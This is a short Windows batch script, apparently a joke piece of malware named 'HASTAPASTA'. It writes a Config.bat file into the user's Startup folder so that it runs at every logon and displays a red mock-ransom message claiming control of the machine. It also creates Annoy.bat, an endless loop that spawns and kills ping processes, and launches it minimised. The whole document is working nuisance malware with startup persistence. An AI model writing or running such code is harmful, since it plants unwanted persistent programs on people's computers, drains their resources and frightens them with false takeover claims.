cd %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
echo color 0c > Config.bat
echo echo off >> Config.bat
echo title HASTAPASTA >> Config.bat
echo cls >> Config.bat
echo echo YOUR MACHINE IS NOW UNDER THE CONTROL OF THE HASTAPASTA MALWARE >> Config.bat
echo echo GIVE US THE PASTA AND WE WILL GO AWAY >> Config.bat
echo echo YOU CAN MAIL US PASTA >> Config.bat
echo echo FIND US >> Config.bat
echo pause >> Config.bat
echo :loop > Annoy.bat
echo start ping 10.0.0.1 >> Annoy.bat
echo taskkill /IM ping.exe >> Annoy.bat
echo goto loop >> Annoy.bat
echo start /min Annoy.bat >> Config.bat
echo exit >> Config.bat
CALL Config.bat